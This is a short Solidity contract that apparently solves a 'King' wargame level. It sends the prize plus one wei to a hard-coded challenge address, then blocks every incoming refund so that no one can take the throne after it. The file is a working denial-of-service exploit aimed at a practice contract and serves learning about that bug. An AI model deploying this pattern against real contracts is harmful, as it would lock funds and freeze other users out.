// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {King} from "./L10__King.sol";

contract L10_Caller__King {
    address payable kingAddress =
        payable(0x464A14e15C11ab9daf5a51fcf58E2C204F44216B);
    uint256 currentPrize = 1000000000000000;
    bool lock = false;

    constructor() payable {
        lock = true;
    }

    function captureKingship() public {
        (bool _success, ) = kingAddress.call{value: currentPrize + 1}("");
        require(_success, "Transfer failed.");
    }

    receive() external payable {
        require(!lock, "Transfer denied.");
    }
}
